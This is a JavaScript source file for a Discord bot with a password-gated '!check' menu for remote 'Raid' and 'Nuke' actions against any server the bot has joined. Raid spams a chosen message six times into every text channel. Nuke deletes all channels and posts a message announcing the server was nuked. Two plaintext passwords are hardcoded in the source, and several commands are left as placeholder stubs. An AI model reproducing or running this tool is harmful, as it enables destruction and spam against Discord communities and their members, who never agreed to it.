const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

// Store user sessions (works across servers)
const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!movebootser') {
    // ... your original !movebootser code ...
  }

  if (content === '!nukeback') {
    // ... your original !nukeback code ...
  }

  if (content === '!ate') {
    // ... your original !ate code ...
  }

  // ==================== !CHECK COMMAND ====================
  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server the bot is in and perform **Raid** or **Nuke**.\n\nPassword required.')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userIdFromId = parts[parts.length - 1]; // Last part is always userId

    // Ownership check - fixed
    if (interaction.user.id !== userIdFromId) {
      return interaction.reply({ 
        content: '❌ This interaction belongs to someone else.', 
        ephemeral: true 
      });
    }

    // ====================== !CHECK FLOW ======================
    if (action === 'check') {

      // 1. Start Button → Password Modal
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');

        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));

        return await interaction.showModal(modal);
      }

      // 2. Password Modal Submit → Show Server List
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) {
          return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });
        }

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id,
          description: `${g.memberCount} members`
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select target server')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password correct. Choose a server to control:',
          components: [new ActionRowBuilder().addComponents(select)],
          ephemeral: true
        });

        userSessions.set(interaction.user.id, {});
      }

      // 3. Server Selected → Action (Raid / Nuke)
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        const selectedGuildId = interaction.values[0];
        const guild = client.guilds.cache.get(selectedGuildId);

        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });

        userSessions.set(interaction.user.id, { guildId: selectedGuildId });

        const actionSelect = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([
            { label: '🔥 Raid', value: 'raid' },
            { label: '☢️ Nuke', value: 'nuke' }
          ]);

        await interaction.update({
          content: `**Selected Server:** ${guild.name}\nWhat do you want to do?`,
          components: [new ActionRowBuilder().addComponents(actionSelect)]
        });
      }

      // 4. Action Selected
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        const selectedAction = interaction.values[0];
        const session = userSessions.get(interaction.user.id);

        if (!session?.guildId) return;

        const guild = client.guilds.cache.get(session.guildId);

        if (selectedAction === 'raid') {
          const modal = new ModalBuilder()
            .setCustomId(`check_raid_modal_${interaction.user.id}`)
            .setTitle('Raid Message');

          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('raid_message')
              .setLabel('Message to spam')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
              .setMaxLength(1800)
          ));

          return await interaction.showModal(modal);
        }

        if (selectedAction === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Confirm Nuke');

          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password')
              .setLabel('Nuke Password')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ));

          return await interaction.showModal(modal);
        }
      }

      // 5. Raid Modal
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_raid_modal_')) {
        const raidMessage = interaction.fields.getTextInputValue('raid_message');
        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);

        if (!guild) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        await interaction.reply({ content: `🚀 Raiding **${guild.name}**...`, ephemeral: true });

        const textChannels = guild.channels.cache.filter(c => c.type === 0);
        for (const channel of textChannels.values()) {
          for (let i = 0; i < 6; i++) {
            channel.send(raidMessage).catch(() => {});
          }
        }

        await interaction.followUp({ content: `✅ Raid completed in ${textChannels.size} channels.`, ephemeral: true });
        userSessions.delete(interaction.user.id);
      }

      // 6. Nuke Modal
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) {
          return interaction.reply({ content: '❌ Wrong nuke password.', ephemeral: true });
        }

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);

        if (!guild) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        await interaction.reply({ content: `☢️ Nuking **${guild.name}**...`, ephemeral: true });

        // Delete all channels
        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
        }

        // Create recovery channel
        const newChannel = await guild.channels.create({
          name: 'chat',
          type: 0,
          reason: 'Nuke by remote control'
        });

        await newChannel.send('# Server has been nuked remotely.');

        await interaction.followUp({ content: `✅ Nuke finished on **${guild.name}**.`, ephemeral: true });
        userSessions.delete(interaction.user.id);
      }
    }

    // Keep your existing movebootser / nukeback / ate logic here...

  } catch (error) {
    console.error('Interaction error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ An error occurred.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
